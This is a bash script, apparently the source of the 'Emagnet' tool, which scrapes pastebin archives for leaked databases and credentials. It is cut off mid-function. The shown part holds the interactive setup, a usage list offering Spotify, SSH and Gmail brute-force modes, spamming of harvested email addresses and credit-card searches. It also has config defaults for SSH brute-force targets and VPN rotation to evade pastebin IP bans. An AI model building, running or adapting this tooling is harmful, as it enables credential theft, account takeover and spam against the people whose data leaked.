#!/bin/bash
################################################################################
################################################################################
####                                                                       #####
#### A notice to all nerds.                                                #####
#### If you will copy developers real work it will not make you a hacker.  #####
#### Resepect all developers, we doing this because it's fun!              #####
####                                                                       #####
################################################################################
################################ SOURCE CODE ###################################
################################################################################
###################### EMAGNET WAS FOUNDED BY WUSEMAN ##########################
################################################################################
####                                                                       #####
####  Emagnet - A tool for find all latest leaked databases                #####
####  Copyright (C) 2018-2019, wuseman                                     #####
####                                                                       #####
####  This program is free software; you can redistribute it and/or modify #####
####  it under the terms of the GNU General Public License as published by #####
####  the Free Software Foundation; either version 2 of the License, or    #####
####  (at your option) any later version.                                  #####
####                                                                       #####
####  This program is distributed in the hope that it will be useful,      #####
####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
####  GNU General Public License for more details.                         #####
####                                                                       #####
####  You must obey the GNU General Public License. If you will modify     #####
####  emagnet file(s), you may extend this exception to your version       #####
####  of the file(s), but you are not obligated to do so.  If you do not   #####
####  wish to do so, delete this exception statement from your version.    #####
####  If you delete this exception statement from all source files in the  #####
####  program, then also delete it here.                                   #####
####                                                                       #####
####  Contact:                                                             #####
####          IRC: Freenode @ wuseman                                      #####
####          Mail: wuseman <wuseman@nr1.nu>                               #####
####                                                                       #####
################################################################################
######## The Nr1 tool for find latest leaked databases online @ 2o18 ###########
################################################################################

banner() {
cat << "EOF"
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'

EOF
printf "%64s \n\n" | tr ' ' '='
}

mustberoot() {  (( ${EUID} > 0 )) && printf "%s\n" "$basename$0: internal error -- root privileges is required" && exit 1;  }
conf() {   CONF="/etc/emagnet.conf";. "${CONF}";}
setupconf() { SETUPCONF=".emagnetconf/emagnet.conf"; . "${SETUPCONF}"; }

alreadyconfigured() {
cp .emagnetconf/emagnet.conf.bak .emagnetconf/emagnet.conf

if [[ -f "/etc/emagnet.conf" ]]; then
        printf "%s\n" "It seems emagnet.conf has already been configured are you"
        read -p "really sure you want to overwrite /etc/emagnet.conf (y/n): " yupiamsure
            if [[ "$yupiamsure" = "n" ]]; then
                printf "\nAborted\n\n"
                exit
            fi
                cp /etc/emagnet.conf /etc/emagnet.conf.bak
                rm /etc/emagnet.conf &> /dev/null
                printf "\nCreated a backup file for you: \e[1m/etc/emagnet.conf.bak\n\n\e[0m"
                sleep 1
fi
}

checkbrowser() {
                  if   [[ -f "$LYNX" && ! -f "$ELINKS" ]]; then
                        sed -i "181d" ${SETUPCONF}
                        sed -i '181 i BROWSER=lynx' ${SETUPCONF}
                elif [[ ! -f "$LYNX" && -f "$ELINKS" ]]; then
                        sed -i "181d" ${SETUPCONF}
                        sed -i '181 i BROWSER=elinks' ${SETUPCONF}
                elif [[ -f $LYNX && -f $ELINKS ]]; then

cat << "EOF"
BROWSER SETUP:
----------------------
Choose wich browser you prefer to use when emagnet will visit
pastebin.com, this setting exist since emagnet is also supported
on elinks and then I added the option to this version too so you can
choose if you dont care hit enter and i will choose one for you by
random. Either let me choose one or you are required to choose one.

It seems you have both lynx and elinks2 installed, you must choose one
EOF

read -p "Browser: (lynx/elinks): " browsertouse
       if [[ -z "${browsertouse}" ]]; then
          WBROWSER="$(echo -e 'elinks\nlynx' | shuf -n 1)"
          printf "\nYou must choose one, however i shuffled and ${WBROWSER} will be used\n"
          printf "\nConfig file has been updated, ${WBROWSER} will be used for downloading files\n"
          sed -i '181d' ${SETUPCONF} ${SETUPCONF}
          sed -i "181 i BROWSER=${WBROWSER}" ${SETUPCONF}
       elif [[ "${browsertouse}" = "lynx" ]]; then
          sed -i "181d" ${SETUPCONF}
          sed -i '181 i BROWSER=lynx' ${SETUPCONF}
          printf "\nConfig file has been updated, lynx will be used for downloading files\n"
       else
          sed -i "181d" ${SETUPCONF}
          sed -i '181 i BROWSER=elinks' ${SETUPCONF}
          printf "\nConfig file has been updated, elinks will be used for downloading files\n"
      fi
    else

cat << "EOF"
WEB BROWSER SETUP:
----------------------
Choose wich browser you prefer to use when emagnet will visit
pastebin.com for the latest uploads urls on site. If you don't
know which one you prefer it doesn't matter, just choose one.
Emagnet require lynx or elinks to be installed, you must choose one
EOF

while true; do
  read -p "Prefered browser to install: (lynx/elinks): " browsertouse2
   case "${browsertouse2}" in #### FIX ---- ADD A BREAK HERE
      "elinks") printf "\nGoing to install ${browsertouse2}, setup will continue when ${browsertouse2} has been installed..\n"
          if     [[ "$DISTRO" = "gentoo"  ]];then emerge --ask elinks
            elif [[ "$DISTRO" = "sabayon" ]];then emerge --ask elinks
            elif [[ "$DISTRO" = "ubuntu"  ]];then apt-get install elinks -qq -y
            elif [[ "$DISTRO" = "debian"  ]];then apt-get install elinks -qq -y
            elif [[ "$DISTRO" = "mint"    ]];then apt-get install elinks -y
            else echo "Emagnet is not supported for ${DISTRO}, please install elinks manually."
          exit 1
          fi
             sed -i "181d" ${SETUPCONF}
             sed -i '181 i BROWSER=elinks' ${SETUPCONF}
             printf "\nConfig file has been updated, elinks will be used when downloading files from pastebin" "${SCRIPT}"
        ;;
     "lynx") printf "\nGoing to install ${browsertouse2}, setup will continue when ${browsertouse2} has been installed..\n"
      if     [[ "$DISTRO" = "gentoo"  ]];then emerge --ask    lynx
        elif [[ "$DISTRO" = "sabayon" ]];then emerge --ask    lynx
        elif [[ "$DISTRO" = "ubuntu"  ]];then apt-get install lynx -qq -y
        elif [[ "$DISTRO" = "debian"  ]];then apt-get install lynx -qq -y
        elif [[ "$DISTRO" = "mint"    ]];then apt-get install lynx -qq -y
        else echo "Emagnet is not supported for ${DISTRO}, please install lynx manually."
        exit 1
      fi
         sed -i "181d" ${SETUPCONF}
         sed -i '181 i BROWSER=lynx' ${SETUPCONF}
         printf "\nConfig file has been updated, lynx will be used when downloading files from pastebin" "${SCRIPT}"
         ;;
   "*")
          printf "\n${browsertouse2} is not a valid option, however i shuffled and ${WBROWSER} will be used\n"
          printf "\nConfig file has been updated, ${WBROWSER} will be used for downloading files\n"
          sed -i "181d" ${SETUPCONF}
          sed -i "181 i BROWSER=$WBROWSER" '$CONF'
          ;;
   "\?")
          printf "\n${browsertouse2} is not a valid option, however i shuffled and ${WBROWSER} will be used\n"
          printf "\nConfig file has been updated, ${WBROWSER} will be used for downloading files\n"
          sed -i "181d" ${SETUPCONF}
          sed -i "181 i BROWSER=$WBROWSER" '$CONF'
          ;;
 esac
done
fi
}

requirements() {
  colors
cat << "EOF"


DEPENDENCIES SETUP:
----------------------
EOF

for REQUIREMENTS in hash curl wget screen parallel; do
    if hash "$REQUIREMENTS" 2>/dev/null; then
        printf '%s%-50s%s\n' "Detected:" "$REQUIREMENTS" "[.${G}ok${E}.]" | sed -e 's/ /./g'
    else
        printf '%s%-50s%s\n' "Detected:" "$REQUIREMENTS" "[.${R}no${E}.]" | sed -e 's/ /./g'
        printf '%s%-50s%s\n' "Detected:" "$REQUIREMENTS" "[.${R}no${E}.]" | sed -e 's/ /./g' >> "/tmp/.emagnet-packages"
    fi
done

if [[ -f "/tmp/.emagnet-packages" ]]; then
missed="$(awk -F'\\[.1m' '{print $2}' /tmp/.emagnet-packages|sed 's/.\]//g')"
missed2="$(awk -F"Detected:" '{print $2}' /tmp/.emagnet-packages|cut -d"." -f1)"
missed3="$(awk -F"Detected:" '{print $2}' /tmp/.emagnet-packages|cut -d"." -f1|wc -l)"
missed4="$(cat /tmp/.emagnet-packages|awk -F"Detected:" '{print $2}'|cut -d"." -f1|xargs|sed 's/ /\, /g'|awk 'BEGIN{FS=OFS=","}$NF=" and"$NF'|sed 's/, and/ and/g')"

		    if [[ "${missed3}" -gt "1" ]]; then
     			   printf "\nYou must have \e[1;37m$missed4\e[0m installed before emagnet can run \nInstall $missed4: (y/n): "
		           read missedpackages
                     else
 		           printf "\nYou must have \e[1;37m$missed2\e[0m installed before emagnet can run \nInstall $missed2: (y/n): "
		           read missedpackages
        fi
		    
        if [[ -z "${missedpackages}" ]]; then
     			   printf "\nYou must have \e[1;37m$missed4\e[0m installed before you can run emagnet, exiting \n\n"
       	                   exit
        fi

           case "${missedpackages}" in
                "y"|"yes"|"YES"|"Y")
                   if   [[ "${DISTRO}" = "gentoo"  ]]; then emerge --ask    "${missed2}"    ;echo
                   elif [[ "${DISTRO}" = "sabayon" ]]; then emerge --ask    "${missed2}"    ;echo
                   elif [[ "${DISTRO}" = "arch"    ]]; then pacman -Syy     "${missed2}"    ;echo
                   elif [[ "${DISTRO}" = "kali"    ]]; then apt-get install "${missed2}" -y ;echo
                   elif [[ "${DISTRO}" = "debian"  ]]; then apt-get install "${missed2}" -y ;echo
                   elif [[ "${DISTRO}" = "mint"    ]]; then apt-get install "${missed2}" -y ;echo
                   elif [[ "${DISTRO}" = "ubuntu"  ]]; then apt-get install "${missed2}" -y ;echo
                   else
                        printf "\n%s\n\n" "Emagnet is not supported for ${DISTRO}, please install ${missed2} manually."
                        exit
                   fi
                   ;;

                 "*"|"no"|"nope"|"n"|"N"|"No")
		                if [[ "${missed3}" -gt "1" ]]; then
     		                	   printf "\nYou must have \e[1;37m$missed4\e[0m installed before you can run emagnet, exiting \n\n"
       	                     exit
                    else
 		                           printf "\nYou must have \e[1;37m$missed2\e[0m installed before you can run emagnet, exiting\n\n"
                        		   exit
                    fi
                    ;;
                    "\?")  echo "Please enter a proper answer y=yes N=no"
             esac
                    fi
}

wip() {
myip="$(curl -s https://nr1.nu/i/)"
cat << "EOF"


IP-ADDRESS SETUP:
----------------------
Set your private ip here if you don't wanna take a risk to get
ip banned on pastebin.com for around ~3200seconds

This will happen if you will set a refresh time to <149 seconds in next step

According to pastebin's FAQ they using 120 seconds for premium users
that is allowed to whitelist one ip for scrape pastebin.
So since they have set 120 seconds and in avarage there is 1 upload every 
3 econds and we are grabbing uploads from archive page (pastebin.com/archive)
that have have 56 uploads listed. This mean you will be safe if you will set
149> seconds since 56 uploads every 3 seconds is 168. if you have setup a VPN
connection then you can set any time since you will change ip anyway so you don't 
have to care, but I still recommending to set a value that is NOT to low. 

It might be good to set refresh time to 1s if you want to be one of the first
that will see the recently uploaded pastes if you wanna brute-force accounts.

This setting have been added for get you informed about pastebin and if
you scrape the website very often, you might risk a permanent ip ban.

EOF

printf "Is \e[1;1m$myip\e[0m your private IP-Address (yes/no): "
read realip
	case "$realip" in
  		"YES"|"y"|"Yes"|"Y"|"yup")
      	            		sed -i '40d' ${SETUPCONF}
                        sed -i '40 i MYIP=' ${SETUPCONF}
      		              sed -i "s/MYIP=/MYIP=$myip/g" ${SETUPCONF}
    		                printf "\nConfig file has been updated, IP has been set to: \e[1;1m$myip\e[0m\n"
      			;;
     "no")
                		  	read -p "Enter your private IP: " currentip
          	   	        sed -i "s/MYIP=/MYIP=$currentip/g" ${SETUPCONF}
                       	printf "\nConfig file has been updated, your IP has been set to: \e[1;1m$currentip\e[0m\n"
      			;;
     "*")
 		                    read -p "Enter your private IP: " currentip
          	   	        sed -i "s/MYIP=/MYIP=$currentip/g" ${SETUPCONF}
             	        	printf "\nConfig file has been updated, your IP has been set to: \e[1;1m$currentip\e[0m\n"
            ;;
	esac

if [[ -z $realip ]]; then
    sed -i '40d' ${SETUPCONF}
    sed -i '40 i MYIP=' ${SETUPCONF}
    sed -i "s/MYIP=/MYIP=127.0.0.1/g" ${SETUPCONF}
    printf "\nConfig file has been updated, the current ip to: \e[1;1m127.0.0.1\e[0m\n"
fi
}

cpusetup() {
setupconf
cat << "EOF"


PROCESSOR SETUP
----------------------
This setting will increase the speed you will download files from
pastebin dramatically, this wont affect how fast you will get banned
EOF

printf "Your\e[1;1m$(cat /proc/cpuinfo|grep 'model name'| awk -F: '{print $2}'|uniq)\e[0m processor has \e[1;1m$(nproc)\e[0m threads\n"
printf "Do you want emagnet to use all \e[1;1m$(nproc)\e[0m threads when downloading: (y/N): "
read threads
if [[ "${threads}" = "y" ]]; then
    sed -i '100d' ${SETUPCONF}
    sed -i "100 i THREADS=" ${SETUPCONF}
    sed -i "s/THREADS=/THREADS=$(nproc)/g" ${SETUPCONF}
    printf "\nConfig file has been updated, cpu threads has been set to $(nproc) thread(s)\n"
elif [[ "${threads}" = "n" ]]; then
    read -p "How many threads do you want to use (Ex: 2): " threadstouse
    sed -i '100d' ${SETUPCONF}
    sed -i "100 i THREADS=" ${SETUPCONF}
    sed -i "s/THREADS=/THREADS=$threadstouse/g" ${SETUPCONF}
    printf "\nConfig file has been updated, cpu threads has been set to ${threadstouse} thread(s).\n"
else
    read -p "How many threads do you want to use (Ex: 2): " threadstouse
    sed -i '100d' ${SETUPCONF}
    sed -i "100 i THREADS=" ${SETUPCONF}
    sed -i "s/THREADS=/THREADS=$threadstouse/g" ${SETUPCONF}
    printf "\nConfig file has been updated, cpu threads has been set to ${threadstouse} thread(s).\n"
fi
}

pathsetup() {
setupconf
cat << "EOF"


PATH SETUP:
----------------------
Please specify in wich folder you to store all downloaded files from pastebin
EOF

read -p "Path (Default: /opt/emagnet): " ehomedir

if [[ -z "${ehomedir}" ]]; then
  mkdir -p "/opt/emagnet"
  sed -i '72d' ${SETUPCONF}
  sed -i "72 i EMAGNET=\/opt\/emagnet" ${SETUPCONF}
  printf "\nConfig file has been updated, using \e[1;1m/opt/emagnet\e[0m for emagnet."
else
  eehomedir="$(echo $ehomedir | sed 's/\/\///g')"
  sed -i '72d' ${SETUPCONF}
  sed -i "72 i EMAGNET=${ehomedir}" ${SETUPCONF}
  printf "\nConfig file has been updated, home dir has been set to: ${eehomedir}/emagnet\n"
fi
}

timesetup() {
setupconf
cat << "EOF"



TIME SETUP:
----------------------
By updating emagnet in 150 seconds or less you will get ip banned
by pastebin.com in ~1200 seconds, if you choose to set emagnet to refresh
in 149 seconds or less anyway then do not leave emagnet running
in background unless you have enable VPN so you will change IP if you 
getting banned otherwise emagnet gonna sleep for 3200 seconds and
you probably gonna miss alot of leaked accounts.

If you want to run emagnet in background without being banned and
capture files 24/7 then you MUST set emagnet to 150s>

IT IS RECOMMENDED TO SET 150 SECONDS OR MORE

EOF

while true; do
printf "%s\n" "Set refresh time in seconds for how often emagnet should download new files from pastebin"
read -p "Time: (Default: 150 Seconds): " o

  if [[ -z "${o}" ]]; then
        sed -i '30d' ${SETUPCONF}
        sed -i "30 i TIME=150" ${SETUPCONF}
        printf "\nConfig file has been updated, refresh time has been set to 150 seconds\n"
        echo -e "\033[1mSETUP FINISHED:\033[0m\n\033[1m----------------------\033[0m"
        printf "Successfully generated /etc/emagnet.conf, have fun!\n\n"
        printf "\nNow you're all set - Have phun - Get started by type: 'bash emagnet --help' :-)\n\n"
        cp .emagnetconf/emagnet.conf  /etc/
        exit 1
        break
  fi

if [[ "${o}" -lt "150" ]]; then
        read -p "Are you REALLY sure you want to set $o seconds (YES/no): " rlysure
fi

 case "${rlysure}" in
   "YES")
          sed -i '30d' ${SETUPCONF}
          sed -i "30 i TIME=${o}" ${SETUPCONF}
          printf "\nConfig file has updated the refresh time to $o seconds\n"
          printf "\n\e[1;31mYou have been warned, expect a ban within ~300 seconds!\n\e[0m\n"
          echo -e "\033[1mSETUP FINISHED:\033[0m\n\033[1m----------------------\033[0m"
          printf "Successfully generated /etc/emagnet.conf, have fun!\n\n"
          printf "\nNow you're all set - Have phun - Get started by type: 'bash emagnet --help' :-)\n\n"
          cp .emagnetconf/emagnet.conf /etc/;
          exit 1
          break ;;

    "*")  printf "\nSet a number between 10 and 3600 is recommended..\n\n";
          exit 1
         continue ;;
 esac
          sed -i "30d" ${SETUPCONF}
          sed -i "30i TIME=${o}" ${SETUPCONF}
          printf "\nRefresh time has been set to: ${o} seconds..\n\n"
          echo -e "\033[1mSETUP FINISHED:\033[0m\n\033[1m----------------------\033[0m"
          printf "Successfully generated /etc/emagnet.conf, have fun!\n\n"
          printf "\nNow you're all set - Have phun - Get started by type: 'bash emagnet --help' :-)\n\n"
          cp .emagnetconf/emagnet.conf  /etc/
          exit 1
	  break
done
}


emagnetseetup() {
if [[ ! -f "/etc/emagnet.conf" ]]; then
       mustberoot
       setupconf
       alreadyconfigured
       cp .emagnetconf/emagnet.conf.bak .emagnetconf/emagnet.conf
       checkbrowser
       requirements
       wip
       cpusetup
       pathsetup
       timesetup
fi
}

usage() {
cat << "EOF"

Usage: ./emagnet [--author] [--emagnet] [--option] .....

  -a, --author        Show author information.
  -l, --license       Show license information.
  -h, --help          Display this very helpful text
  -n, --notify        Set notifications on or off
  -S, --setup         Run emagnet-setup.sh again
  -t, --time          Set refresh time
  -v, --vpn           Toggle VPN on or off (true/false)
  -V, --version       Displays version information.

  -b, --backup        Create a compressed archive
  -d, --stats         Print stats from all folders
  -e, --emagnet       Download latest uploads and store leaked dbs
  -f, --fuzzer        Create random urls and download unknown pastes
  -F, --find          Search for credit cards, images and much more via  menu
  -g, --bruteforce    Same as '-e' with brute-force mode on
                      Available options: SPOTIFY/SSH/GMAIL
  -i, --ip            Print you current WAN IPv4/IPv6
  -k, --kill          Kill emagnet sessions
  -m, --move          Move files to archive
  -q, --quiet         Run in screen
  -s, --spam          Spam email addresses we found today
  -x, --syntax        Download uploads sorted by syntax

EOF
}


nothingcalled() {
if [[ -z $1 ]]; then 
  usage
  exit 1
fi
}

author() {
cat << "EOF"

 Copyright (C) 2018-2019, wuseman

 Emagnet was founded in 2015 and was released as open source
 on github.com/wuseman/emagnet in January 2018 and is licensed
 under GNU LESSER GENERAL PUBLIC LICENSE Version v3.1

   - Author: wuseman <wuseman@nr1.nu>
   - IRC   : wuseman <irc.freenode.com>

 Please report bugs/issues on:

   - https://github.com/wuseman/EMAGNET/issues

EOF
}

colors() {
R="$(tput setaf 1)"
G="$(tput setaf 2)"
Y="$(tput setaf 3)"
B="$(tput setaf 4)"
M="$(tput setaf 5)"
C="$(tput setaf 6)"
W="$(tput setaf 7)"
E="$(tput sgr0)"
}


copyconf() { if [[ -f .emagnetconf/emagnet.conf ]]; then cp .emagnetconf/emagnet.conf.bak .emagnetconf/emagnet.conf;fi; }

iconnection() {
ping -i 0.2 -c 1 1.1.1.1 &> /dev/null
if [[ $? -gt "0" ]]; then
     echo "It seems you're not connected to internet properly, aborted"
     exit 1
fi
}

mustbefilled() {
conf
  if [[ -z $DEBUG          ]];   then sed -i "12d"  $CONF;sed -i '12  i DEBUG=false'                                                                                                             $CONF;fi
  if [[ -z $PASTEBIN       ]];   then sed -i '21d'  $CONF;sed -i '21  i PASTEBIN=https:\/\/www.pastebin.com\/archive'                                                                            $CONF;fi
  if [[ -z $WIP            ]];   then sed -i '50d'  $CONF;sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                                                                               $CONF;fi
  if [[ -z $WIP2           ]];   then sed -i '51d'  $CONF;sed -i '51  i WIP2='                                                                                                                   $CONF;fi
  if [[ -z $WIP3           ]];   then sed -i '52d'  $CONF;sed -i '52  i WIP3='                                                                                                                   $CONF;fi
  if [[ -z $WIP4           ]];   then sed -i '53d'  $CONF;sed -i '53  i WIP4='                                                                                                                   $CONF;fi
  if [[ -z $EMAGNETHOME    ]];   then sed -i "73d"  $CONF;sed -i '73  i EMAGNETHOME=$EMAGNET\/incoming\/$(date +%Y-%m-%d)'                                                                       $CONF;fi
  if [[ -z $EMAGNETLOGS    ]];   then sed -i "74d"  $CONF;sed -i '74  i EMAGNETLOGS=$EMAGNETHOME/logs'                                                                                           $CONF;fi
  if [[ -z $EMAGNETPW      ]];   then sed -i "75d"  $CONF;sed -i '75  i EMAGNETPW=$EMAGNETHOME\/password-files'                                                                                  $CONF;fi
  if [[ -z $EMAGNETALL     ]];   then sed -i "76d"  $CONF;sed -i '76  i EMAGNETALL=$EMAGNETHOME\/all-files'                                                                                      $CONF;fi
  if [[ -z $EMAGNETCRAP    ]];   then sed -i "77d"  $CONF;sed -i '77  i EMAGNETCRAP=$EMAGNETHOME\/.pastebin'                                                                                     $CONF;fi
  if [[ -z $EMAGNETTEMP    ]];   then sed -i "78d"  $CONF;sed -i '78  i EMAGNETTEMP=$EMAGNETHOME\/.temp'                                                                                         $CONF;fi
  if [[ -z $EMAGNETARCHIVE ]];   then sed -i "79d"  $CONF;sed -i '79  i EMAGNETARCHIVE=$EMAGNET/archive'                                                                                         $CONF;fi
  if [[ -z $EMAGNETDB      ]];   then sed -i "80d"  $CONF;sed -i '80  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     $CONF;fi
  if [[ -z $EMAGNETBACKUP  ]];   then sed -i "81d"  $CONF;sed -i '81  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           $CONF;fi
  if [[ -z $EMAGNETSYNTAX  ]];   then sed -i "82d"  $CONF;sed -i '82  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax'                                                                            $CONF;fi
  if [[ -z $VERSION        ]];   then sed -i '91d'  $CONF;sed -i '91  i VERSION=3.2'                                                                                                             $CONF;fi
  if [[ -z $THREADS        ]];   then sed -i '100d' $CONF;sed -i "100 i THREADS=1"                                                                                                               $CONF;fi
  if [[ -z $IDLETIME       ]];   then sed -i '109d' $CONF;sed -i "109 i IDLETIME=3600"                                                                                                           $CONF;fi
  if [[ -z $GBRUTEFORCE    ]];   then sed -i '118d' $CONF;sed -i '118 i GBRUTEFORCE=false'                                                                                                       $CONF;fi
  if [[ -z $SBRUTEFORCE    ]];   then sed -i '119d' $CONF;sed -i '119 i SBRUTEFORCE=false'                                                                                                       $CONF;fi
  if [[ -z $PBRUTEFORCE    ]];   then sed -i '120d' $CONF;sed -i '120 i PBRUTEFORCE=false'                                                                                                       $CONF;fi
  if [[ -z $EMAIL2SEND     ]];   then sed -i '129d' $CONF;sed -i '129 i EMAIL2SEND='                                                                                                             $CONF;fi
  if [[ -z $NOTIFY         ]];   then sed -i '138d' $CONF;sed -i '138 i NOTIFY=false'                                                                                                            $CONF;fi
  if [[ -z $SSHUSER        ]];   then sed -i '169d' $CONF;sed -i '169 i SSHUSER="root"'                                                                                                          $CONF;fi
  if [[ -z $SSHPORT        ]];   then sed -i '170d' $CONF;sed -i '170 i SSHPORT="22"'                                                                                                            $CONF;fi
  if [[ -z $SSHPASS        ]];   then sed -i '171d' $CONF;sed -i '171 i SSHPASS=""'                                                                                                              $CONF;fi
  if [[ -z $SSHTARGETS     ]];   then sed -i '172d' $CONF;sed -i '172 i SSHTARGETS="/tmp/.emagnet-sshbruter.txt"'                                                                                $CONF;fi
  if [[ -z $SSHPORTSCAN    ]];   then sed -i '173d' $CONF;sed -i '173 i SSHPORTSCAN="/tmp/.emagnet-portscan"'                                                                                    $CONF;fi
  if [[ -z $VPN            ]];   then sed -i '150d' $CONF;sed -i '150 i VPN=false'                                                                                                               $CONF;fi
  if [[ -z $VPNROOT        ]];   then sed -i '151d' $CONF;sed -i '151 i VPNROOT=/etc/openvpn'                                                                                                    $CONF;fi
  if [[ -z $VPNPROVIDER    ]];   then sed -i '152d' $CONF;sed -i '152 i VPNPROVIDER=$VPNROOT/'                                                                                                   $CONF;fi
  if [[ -z $VPNPROVIDER2   ]];   then sed -i '153d' $CONF;sed -i '153 i VPNPROVIDER2=$VPNROOT/'                                                                                                  $CONF;fi
  if [[ -z $VPNPROVIDER3   ]];   then sed -i '154d' $CONF;sed -i '154 i VPNPROVIDER3=$VPNROOT/'                                                                                                  $CONF;fi
  if [[ -z $VPNCOUNTRYS    ]];   then sed -i '155d' $CONF;sed -i '155 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   $CONF;fi
  if [[ -z $VPNCOUNTRYS2   ]];   then sed -i '156d' $CONF;sed -i '156 i VPNCOUNTRYS2="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  $CONF;fi
  if [[ -z $VPNCOUNTRYS3   ]];   then sed -i '157d' $CONF;sed -i '157 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  $CONF;fi
conf
}

paths() {
  if [[ ! -d $EMAGNETHOME    ]];    then mkdir -p $EMAGNETHOME     &> /dev/null;  fi
  if [[ ! -d $EMAGNETDB      ]];    then mkdir -p $EMAGNETDB       &> /dev/null;  fi
  if [[ ! -d $EMAGNETPW      ]];    then mkdir -p $EMAGNETPW       &> /dev/null;  fi
  if [[ ! -d $EMAGNETTEMP    ]];    then mkdir -p $EMAGNETTEMP     &> /dev/null;  fi
  if [[ ! -d $EMAGNETCRAP    ]];    then mkdir -p $EMAGNETCRAP     &> /dev/null;  fi
  if [[ ! -d $EMAGNETALL     ]];    then mkdir -p $EMAGNETALL      &> /dev/null;  fi
  if [[ ! -d $EMAGNETARCHIVE ]];    then mkdir -p $EMAGNETARCHIVE  &> /dev/null;  fi
  if [[ ! -d $EMAGNETLOGS    ]];    then mkdir -p $EMAGNETLOGS     &> /dev/null;  fi
}

heavyload() {
$BROWSER -dump $PASTEBIN|grep -q "is under heavy load right now"
  if [[ $? = "0" ]]; then
   for (( ; ; )); do
   wait_time=60
   temp_cnt=${wait_time}
     while [[ ${temp_cnt} -gt 0 ]]; do
        printf "\rPastebin is currently under heavy load, let's wait: \e[1;1m%1d\e[0m" ${temp_cnt};printf " seconds";sleep 1;((temp_cnt--))
    done
        echo ""
        bash emagnet --emagnet
    done
        bash emagnet --emagnet
  fi
}

Iwasbanned() {
clear;banner
$BROWSER -dump $PASTEBIN|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
  if [[ $VPN = "false" ]]; then
   for (( ; ; )); do
      wait_time=$IDLETIME
      temp_cnt=${wait_time}
   while [[ ${temp_cnt} -gt 0 ]]; do
      printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
      printf " seconds";sleep 1;((temp_cnt--))
   done
        printf "\n"
        clear
        banner
        bash emagnet --emagnet
        sleep 2
   done
        clear
        banner
        bash emagnet --emagnet
       exit
   else
       banned
  fi
fi
}

vpnsetup() {
VPNCONFIG=$(awk -F'/' '/VPNPROVIDER/ {print $2}' /etc/emagnet.conf|cut -d'"' -f1|head -2|sed '1d')
VPNCONFIG2=$(awk -F'/' '/VPNPROVIDER/ {print $2}' /etc/emagnet.conf|cut -d'"' -f1|head -2|tail -1)
VPNCONFIG3=$(awk -F'/' '/VPNPROVIDER/ {print $2}' /etc/emagnet.conf|cut -d'"' -f1|head -3|tail -1)

case $COUNTRY in
   belgium)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.be.ovpn      &> /dev/null & ;;
   bulgaria)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.bg.ovpn      &> /dev/null & ;;
   czech)          cd $VPNPROVIDER;openvpn --config $VPNCONFIG.cz.ovpn      &> /dev/null & ;;
   denmark)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.dk.ovpn      &> /dev/null & ;;
   spain)          cd $VPNPROVIDER;openvpn --config $VPNCONFIG.es.ovpn      &> /dev/null & ;;
   finland)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.fi.ovpn      &> /dev/null & ;;
   united-kingdom) cd $VPNPROVIDER;openvpn --config $VPNCONFIG.gb.ovpn      &> /dev/null & ;;
   greece)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.gr.ovpn      &> /dev/null & ;;
   hongkong)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.hk.ovpn      &> /dev/null & ;;
   hungaria)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.hu.ovpn      &> /dev/null & ;;
   italy)          cd $VPNPROVIDER;openvpn --config $VPNCONFIG.it.ovpn      &> /dev/null & ;;
   moldavia)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.md.ovpn      &> /dev/null & ;;
   netherlands)    cd $VPNPROVIDER;openvpn --config $VPNCONFIG.nl.ovpn      &> /dev/null & ;;
   norway)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.no.ovpn      &> /dev/null & ;;
   poland)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.pl.ovpn      &> /dev/null & ;;
   portugal)       cd $VPNPROVIDER;openvpn --config $VPNCONFIG.pt.ovpn      &> /dev/null & ;;
   romania)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.ro.ovpn      &> /dev/null & ;;
   russia)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.rs.ovpn      &> /dev/null & ;;
   sweden)         cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se.ovpn      &> /dev/null & ;;
